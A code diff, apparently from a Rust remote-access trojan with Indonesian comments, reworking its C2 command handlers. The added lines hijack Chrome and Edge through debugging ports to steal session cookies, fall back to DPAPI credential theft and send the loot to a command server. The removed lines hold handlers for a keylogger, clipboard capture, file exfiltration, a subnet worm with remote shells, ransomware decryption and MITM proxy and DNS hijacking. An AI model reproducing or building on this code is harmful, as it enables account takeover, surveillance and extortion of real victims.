@@ -1,372 +1,111 @@
 } else if data_upper.starts_with(
-                            std::str::from_utf8(obfstr!("STEAL:ALL").as_ref()).unwrap(),
-                        ) || data_trimmed == "/steal" { 
-                            println!("{}[*] Menerima instruksi STEAL:ALL. Memulai pencurian data browser...{}", BRIGHT_BLUE, RESET);
-                            
-                            // 1. Coba ambil cookies via CDP (bypass v20 LOCKED)
-                            // 1. Coba ambil cookies via CDP menggunakan Smart Discovery (Bypass v127+)
-                            let mut theft_result = String::new();
-                            if let Ok(cdp_cookies) = crate::browser_cdp::steal_cookies_via_cdp("chrome", 92222) {
-                                println!("{}[+] Berhasil mengeksrak Data dari Chrome", BRIGHT_BLUE, RESET);
-                                for (name, val, domain) in cdp_cookies {
-                                    theft_result.push_str(&format!("[CDP_COOKIE] {} | {}={}\n", domain, name, val));
-                                }
-                            }
-                            if let Ok(cdp_cookies) = crate::browser_cdp::steal_cookies_via_cdp("edge", 92223) {
-                                println!("{}[+] Berhasil mengeksrak Data dari Edge{}", BRIGHT_BLUE, RESET);
-                                for (name, val, domain) in cdp_cookies {
-                                    theft_result.push_str(&format!("[CDP_COOKIE] {} | {}={}\n", domain, name, val));
-                                }
-                            }
-                            let cdp_summary = crate::browser_cdp::hijack_all_available_browsers();
-                            for summary in cdp_summary {
-                                theft_result.push_str(&format!("[CDP_REPORT] {}\n", summary));
-                            }
+    std::str::from_utf8(obfstr!("STEAL_SESSION").as_ref()).unwrap(),
+) {
+    // Ambil argumen dari C2 (misal: "CHROME" atau "EDGE")
+    let sub_cmd = data_trimmed[14..].trim().to_uppercase();
+    println!("{}[*] Instruksi Steal Session (Sniper Mode): {}{}", BRIGHT_BLUE, sub_cmd, RESET);
 
-                            // 2. Fallback/Tambahan dari database lokasl
-                            let theft_result_vec = crate::browser_thief::steal_browser_creds();
-                            theft_result.push_str(&theft_result_vec.join("\n"));
-                            
-                            send_response(
-                                &c2_host_arc,
-                                c2_port,
-                                &agent_id_arc,
-                                theft_result.as_bytes(),
-                            )
-                            .await;
-                            continue;
-                         } // Lanjutkan ke iterasi loop berikutnya setelah menangani perintah ini
-                        } else if data_upper.starts_with(
-                            std::str::from_utf8(obfstr!("KEYLOG:START").as_ref()).unwrap(),
-                        ) { // This is a comment, no need to change
-                            keylogger::start_keylogger();
-                            send_response(&c2_host_arc, c2_port, &agent_id_arc, b"Keylogger aktif")
-                                .await;
-                            continue;
-                        } else if data_upper.starts_with(
-                            std::str::from_utf8(obfstr!("KEYLOG:DUMP").as_ref()).unwrap(),
-                        ) {
-                            // FIX: Ambil data dan kirim balik ke server 
-                            let keylogger_data = keylogger::get_captured_keys();
-                            send_response(
-                                &c2_host_arc,
-                                c2_port,
-                                &agent_id_arc,
-                                keylogger_data.as_bytes(),
-                            )
-                            .await;
-                            continue;
-                        } else if data_upper.starts_with(
-                            std::str::from_utf8(obfstr!("CLIPBOARD:START").as_ref()).unwrap(),
-                        ) { // This is a comment, no need to change
-                            clipboard::start_clipboard_monitor();
-                            send_response(
-                                &c2_host_arc,
-                                c2_port,
-                                &agent_id_arc,
-                                b"Pemantauan clipboard aktif",
-                            )
-                            .await;
-                            continue;
-                        } else if data_upper.starts_with(
-                            std::str::from_utf8(obfstr!("CLIPBOARD:DUMP").as_ref()).unwrap(),
-                        ) {
-                            let clipboard_data = clipboard::get_captured_clipboard(); 
-                            if clipboard_data.is_empty() {
-                                send_response(
-                                    &c2_host_arc,
-                                    c2_port,
-                                    &agent_id_arc,
-                                    b"Clipboard log is empty",
-                                )
-                                .await;
-                            } else {
-                                send_response(
-                                    &c2_host_arc,
-                                    c2_port,
-                                    &agent_id_arc,
-                                    clipboard_data.as_bytes(),
-                                )
-                                .await;
-                            }
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("EXFIL:").as_ref()).unwrap())
-                        {
-                            let path_str = data_trimmed[6..].trim().to_string();
-                            match exfil::exfiltrate_file(
-                                &path_str,
-                                &c2_host_arc,
-                                c2_port,
-                                &agent_id_arc,
-                            )
-                            .await
-                            {
-                                Ok(_) => {
-                                    send_response(
-                                        &c2_host_arc,
-                                        c2_port,
-                                        &agent_id_arc,
-                                        format!("Eksfiltrasi {} berhasil", path_str).as_bytes(),
-                                    )
-                                    .await
-                                }
-                                Err(e) => {
-                                    send_response(
-                                        &c2_host_arc,
-                                        c2_port,
-                                        &agent_id_arc,
-                                        format!("Kesalahan Eksfiltrasi: {}", e).as_bytes(),
-                                    )
-                                    .await
-                                }
-                            }
-                            continue;
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("LOCATION").as_ref()).unwrap())
-                        {
-                            println!("{}[*] Menerima instruksi Pelacakan Lokasi...{}", BRIGHT_BLUE, RESET);
-                            #[cfg(target_os = "windows")]
-                            {
-                                let loc_data = location::get_windows_location().await;
-                                send_response(&c2_host_arc, c2_port, &agent_id_arc, loc_data.as_bytes()).await;
-                            }
-                            #[cfg(feature = "android")]
-                            {
-                                // Android bridge call
-                                crate::android_bridge::trigger_location();
-                                send_response(&c2_host_arc, c2_port, &agent_id_arc, b"Android location triggered").await;
-                            }
-                            continue;
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("ALARM").as_ref()).unwrap())
-                        {
-                            println!("{}[*] Menerima instruksi Alarm Perangkat...{}", BRIGHT_BLUE, RESET);
-                            #[cfg(target_os = "windows")]
-                            {
-                                location::trigger_windows_alarm();
-                                send_response(&c2_host_arc, c2_port, &agent_id_arc, b"Windows Beep Triggered").await;
-                            }
-                            #[cfg(feature = "android")]
-                            {
-                                crate::android_bridge::trigger_alarm();
-                                send_response(&c2_host_arc, c2_port, &agent_id_arc, b"Android Alarm Triggered").await;
-                            }
-                            continue;
-                        } else if data_upper.starts_with(obfstr!("SUPERPOOL:")) {
-                            let target_addr = data_trimmed[10..].trim().to_string();
-                            println!("{}[*] Memicu SuperPool Reflective Shell ke {}...{}", BRIGHT_BLUE, target_addr, RESET);
-                            let pool = crate::remote_access::ElevateSuperPool::new();
-                            let subnet_str = "192.168.1.0/25";
-                            if let Ok(net) = subnet_str.parse::<ipnet::Ipv4Net>() {
-                                println!("{}[+] memulai serangan jarak jauh ke subnet {} (Total: {} host){}", DARK_RED, subnet_str, net.hosts().count(), RESET);
-                                for ip in net.hosts() {
-                                    let target = format!("{}:4444", ip);
-                                    let target_ip_only = ip.to_string();
-                                    let pool_clone = pool.clone();
-                                    tokio::spawn(async move {
-                                        crate::worm::deploy_worm_payload(&target_ip_only);
-                                    if let Err(_e) = pool_clone.spawn_remote_shell(&target).await {
-                                    eprintln!("Gagal mengakses {}: {}", target, _e);
-                                    }
-                                });
-                            }
-                            } else {
-                            eprint!("[!] Format subnet tidak valid. Gunakan format CIDR seperti 192.168.1.0/24: {}", subnet_str);
-                        }
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("SLEEP:").as_ref()).unwrap())
-                        {
-                            let sec_str = data_trimmed[6..].trim().to_string();
-                            if let Ok(new_val) = sec_str.parse::<f64>() {
-                                current_lambda = new_val;
-                                send_response(
-                                    &c2_host_arc,
-                                    c2_port,
-                                    &agent_id_arc,
-                                    format!("Interval tidur diperbarui menjadi {} detik", new_val)
-                                        .as_bytes(),
-                                )
-                                .await;
-                            }
-                            continue;
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("DECRYPT:").as_ref()).unwrap())
-                        { 
-                            let cmd_data = data_trimmed[8..].trim().to_string();
-                            // FIX: Support both '|' and ' ' as delimiters for decrypt command
-                            let parts: Vec<&str> = if cmd_data.contains('|') {
-                                cmd_data.split('|').collect()
-                            } else {
-                                cmd_data.split_whitespace().collect()
-                            };
-                            if parts.len() >= 2 && !parts[0].is_empty() {
-                                println!("{}[*] Memulai proses dekripsi pada: {}{}", BRIGHT_BLUE, parts[0], RESET);
-                                let target_dir = parts[0].trim().to_string();
-                                if let Ok(key_bytes) = hex::decode(parts[1].trim()) {
-                                    let mut aes_key = [0u8; 32];
-                                    if key_bytes.len() == 32 {
-                                        aes_key.copy_from_slice(&key_bytes);
-                                        let stream = crate::crypto_ops::RansomwareModule::decrypt_directory_streaming(target_dir, aes_key);
-                                        pin_mut!(stream);
-                                        while let Some(event) = stream.next().await {
-                                            if let Ok(ev) = event {
-                                                if ev.event_type == EVENT_TYPE_COMPLETE {
-                                                    send_response(
-                                                        &c2_host_arc,
-                                                        c2_port,
-                                                        &agent_id_arc,
-                                                        b"Dekripsi Selesai",
-                                                    )
-                                                    .await;
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            } else {
-                                send_response(
-                                    &c2_host_arc,
-                                    c2_port,
-                                    &agent_id_arc,
-                                    b"ERROR: Format salah. Gunakan: /decrypt <path>|<key> atau /decrypt <path> <key>",
-                                )
-                                .await;
-                            }
-                            continue;
-                        } else if data_upper.starts_with(
-                            std::str::from_utf8(obfstr!("BLOCKCHAIN:REPORT").as_ref()).unwrap(),
-                        ) || data_upper.starts_with(std::str::from_utf8(obfstr!("BLOCKCHAIN:STATUS").as_ref()).unwrap()) { // FIX: Tambahkan BLOCKCHAIN:STATUS 
-                            let _h = c2_host_arc.to_string();
-                            let id = agent_id_arc.to_string();
-                            let rpc = "https://rpc-amoy.polygon.technology".to_string();
-                            tokio::spawn(async move {
-                                if let Ok(mgr) =
-                                    crate::legacy::BlockchainManager::new(&rpc, "", "").await
-                                {
-                                    match mgr.report_infection(id, 9).await {
-                                        Ok(msg) => println!("[BLOCKCHAIN] {}", msg),
-                                        Err(e) => eprintln!("[BLOCKCHAIN] Error: {}", e),
-                                    }
-                                } else {
-                                    eprintln!("[BLOCKCHAIN] Initialization failed");
-                                }
-                            });
-                            send_response(
-                                &c2_host_arc,
-                                c2_port,
-                                &agent_id_arc,
-                                b"C2 blockchain logged",
-                            )
-                            .await;
-                            continue;
-                        } else if data_upper 
-                            .starts_with(std::str::from_utf8(obfstr!("MITM_PROXY").as_ref()).unwrap())
-                        {
-                            let c2_proxy_addr = data_trimmed[11..].trim().to_string();
-                            println!("{}[*] Memulai proxy MITM untuk memantau lalu lintas browser...{} {}", BRIGHT_BLUE, c2_proxy_addr, RESET);
-                            if let Err(e) = 
-                                crate::network::hijack_system_proxy(&c2_proxy_addr)
-                                {
-                                    eprintln!("[!] Gagal menginfeksi Proxy: {}", e);
-                                } else {
-                                    println!("{}[+] Proxy berhasil diinfeksi dan semua traffic internet korban melewati C2.{}", DARK_RED, RESET);
-                                }
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("STEAL_SESSION").as_ref()).unwrap(),
-                        ) 
-                        {
-                            let sub_cmd = data_trimmed[14..].trim().to_uppercase();
-                            println!("{}[*] Instruksi Steal Session: {}{}", BRIGHT_BLUE, sub_cmd, RESET);
-                            
-                            let mut results = Vec::new();
-                            match sub_cmd.as_str() {
-                                "CHROME" => {
-                                    if let Ok(cookies) = crate::browser_cdp::steal_cookies_via_cdp("chrome", 9222) {
-                                        results.push(format!("CHROME_COOKIES: {}", cookies.len()));
-                                        let _ = send_response(&c2_host_arc, c2_port, &agent_id_arc, &serde_json::to_vec(&cookies).unwrap_or_default()).await;
-                                    }
-                                }
-                                "EDGE" => {
-                                    if let Ok(cookies) = crate::browser_cdp::steal_cookies_via_cdp("edge", 9223) {
-                                        results.push(format!("EDGE_COOKIES: {}", cookies.len()));
-                                        let _ = send_response(&c2_host_arc, c2_port, &agent_id_arc, &serde_json::to_vec(&cookies).unwrap_or_default()).await;
-                                    }
-                                }
-                                _ => { // Mode AUTO: Cari semua yang tersedia
-                                    let report = crate::browser_cdp::hijack_all_available_browsers();
-                                    results.extend(report);
-                                }
-                            }
-                            
-                            send_response(&c2_host_arc, c2_port, &agent_id_arc, results.join("\n").as_bytes()).await;
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("REVERT_DNS:").as_ref()).unwrap(),
-                        ) 
-                        {
-                            let domain = data_trimmed[11..].trim();
-                            let _ = crate::network::revert_local_dns(domain);
-                            println!("{}[+] File hosts dibersihkan, koneksi ke {} kembali normal.{}", DARK_RED, domain, RESET);
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("MITM_DNS").as_ref()).unwrap()) 
-                        {
-                            let parts: Vec<&str> = data_trimmed[9..].trim().split_whitespace().collect();
-                                if parts.len() == 2 {
-                                    let ip = parts[0];
-                                    let domain = parts[1];
-                                    let _ = crate::network::hijack_local_dns(domain, ip);
-                                    println!("{}[+] Resolusi DNS untuk {} telah diubah atau dibelokkan ke {}{}", DARK_RED, domain, ip, RESET);
-                                } else {
-                                    eprintln!("{}[!] Format perintah MITM_DNS salah. Gunakan: MITM_DNS <IP> <DOMAIN>{}", DARK_RED, RESET);
-                                }
-                        } else if data_upper
-                            .starts_with(std::str::from_utf8(obfstr!("MITM_REVERT").as_ref()).unwrap())
-                        {
-                             println!("{}[*] Mematikan MitM Proxy dan membersihkan jejak OS...{}", BRIGHT_BLUE, RESET);
-                              if let Err(e) = crate::network::revert_system_proxy() {
-                                eprintln!("[!] Gagal mengembalikan proxy: {}", e);
-                            } else {
-                                println!("{}[+] Proxy sistem kembali normal, koneksi target tidak lagi disadap.{}", DARK_RED, RESET);
-                            } 
+    let mut results = String::new();
 
+    match sub_cmd.as_str() {
+        "CHROME" => {
+            // 1. Matikan dan nyalakan ulang HANYA Chrome di port 9222
+            println!("[*] Membajak Chrome...");
+            let _ = crate::browser_cdp::hijack_browser("chrome"); // Pastikan fungsi ini ada di browser_cdp.rs
+            tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
 
+            // 2. Ekstrak datanya
+            if let Ok(cookies) = crate::browser_cdp::steal_cookies_via_cdp("chrome", 9222) {
+                results.push_str(&format!("Berhasil mengekstrak {} Cookie dari CHROME\n", cookies.len()));
+                for (name, val, domain) in cookies {
+                    results.push_str(&format!("[CHROME] {} | {}={}\n", domain, name, val));
+                }
+            } else {
+                results.push_str("[!] Gagal mengekstrak Chrome.\n");
+            }
+        }
+        "EDGE" => {
+            // 1. Matikan dan nyalakan ulang HANYA Edge di port 9223
+            println!("[*] Membajak Edge...");
+            let _ = crate::browser_cdp::hijack_browser("edge");
+            tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
 
-
-
-
-
-
-
-// 1. Siapkan wadah besar untuk menampung semua hasil (Chrome + Edge)
-let mut all_theft_results = Vec::new();
-
-// 2. Definisikan target peramban dan port uniknya agar tidak tabrakan
-let targets = vec![
-    ("chrome", 9222),
-    ("edge", 9223),
-];
-
-// 3. Jalankan pemindahan secara berurutan menggunakan Loop
-for (browser_name, port) in targets {
-    println!("[*] Mencoba ekstraksi CDP pada: {} (Port: {})", browser_name, port);
-    
-    // Panggil fungsi ekstraksi dengan parameter yang sesuai
-    if let Ok(mut cdp_cookies) = crate::browser_cdp::steal_cookies_via_cdp(browser_name, port) {
-        println!("[+] Berhasil mengambil data dari {}", browser_name);
-        
-        // Gabungkan hasil ke wadah besar
-        all_theft_results.append(&mut cdp_cookies);
-    } else {
-        println!("[!] Lewati {}: Peramban tidak aktif atau port tertutup.", browser_name);
+            // 2. Ekstrak datanya
+            if let Ok(cookies) = crate::browser_cdp::steal_cookies_via_cdp("edge", 9223) {
+                results.push_str(&format!("Berhasil mengekstrak {} Cookie dari EDGE\n", cookies.len()));
+                for (name, val, domain) in cookies {
+                    results.push_str(&format!("[EDGE] {} | {}={}\n", domain, name, val));
+                }
+            } else {
+                results.push_str("[!] Gagal mengekstrak Edge.\n");
+            }
+        }
+        _ => {
+            results.push_str("[!] Format salah. Gunakan perintah di C2: /steal_session chrome atau /steal_session edge");
+        }
     }
+
+    // 3. Kirim hasil tembakan sniper ke C2
+    send_response(&c2_host_arc, c2_port, &agent_id_arc, results.as_bytes()).await;
+    continue;
 }
 
-// 4. Setelah Loop selesai, baru kirim satu paket besar ke C2
-if !all_theft_results.is_empty() {
-    match serde_json::to_string(&all_theft_results) {
-        Ok(serialized_data) => {
-            println!("[*] Mengirim total {} cookie ke C2...", all_theft_results.len());
-            send_response(host, port, agent_id, serialized_data.as_bytes()).await;
-        },
-        Err(e) => eprintln!("[!] Gagal serialisasi data: {}", e),
+
+
+
+} else if data_upper.starts_with(
+    std::str::from_utf8(obfstr!("STEAL:ALL").as_ref()).unwrap(),
+) || data_trimmed == "/steal" { 
+    println!("{}[*] Menerima instruksi STEAL:ALL. Memulai pencurian data browser...{}", BRIGHT_BLUE, RESET);
+
+    let mut theft_result = String::new();
+
+    // 1. TAHAP PEMBAJAKAN (Membuka gerbang port 9222 & 9223)
+    println!("{}[*] Menginisiasi Smart Discovery & Hijack v127+...{}", BRIGHT_BLUE, RESET);
+    let cdp_summary = crate::browser_cdp::hijack_all_available_browsers();
+    for summary in cdp_summary {
+        theft_result.push_str(&format!("[CDP_REPORT] {}\n", summary));
     }
+
+    // JEDA KRITIS: Beri waktu 2 detik agar proses Chrome/Edge benar-benar selesai terbuka
+    // sebelum kita mencoba menyambungkan WebSocket-nya.
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+
+    // 2. TAHAP EKSTRAKSI (Menyedot data dari gerbang yang sudah dibuka)
+    let targets = vec![
+        ("chrome", 9222), // Port untuk Chrome
+        ("edge", 9223),   // Port untuk Edge
+    ];
+
+    for (browser_name, port) in targets {
+        println!("[*] Mencoba ekstraksi CDP pada: {} (Port: {})", browser_name, port);
+        
+        if let Ok(cdp_cookies) = crate::browser_cdp::steal_cookies_via_cdp(browser_name, port) {
+            println!("{}[+] Berhasil mengekstrak {} Cookie dari {}{}", BRIGHT_BLUE, cdp_cookies.len(), browser_name, RESET);
+            
+            // Masukkan data ke wadah pengiriman
+            for (name, val, domain) in cdp_cookies {
+                theft_result.push_str(&format!("[CDP_{}] {} | {}={}\n", browser_name.to_uppercase(), domain, name, val));
+            }
+        } else {
+            println!("{}[!] Ekstraksi {} dilewati (Tidak aktif/Gagal){}", DARK_RED, browser_name, RESET);
+        }
+    }
+
+    // 3. TAHAP LEGACY (Fallback untuk browser tua atau data statis via DPAPI)
+    println!("{}[*] Menjalankan Fallback DPAPI SQLite...{}", BRIGHT_BLUE, RESET);
+    let theft_result_vec = crate::browser_thief::steal_browser_creds();
+    theft_result.push_str(&theft_result_vec.join("\n"));
+
+    // 4. TAHAP PENGIRIMAN (Kirim 1 paket besar berisi semua data ke C2)
+    println!("{}[*] Mengirim total rekapan jarahan ke Server C2...{}", BRIGHT_BLUE, RESET);
+    send_response(
+        &c2_host_arc,
+        c2_port,
+        &agent_id_arc,
+        theft_result.as_bytes(),
+    )
+    .await;
+    
+    continue;
 }
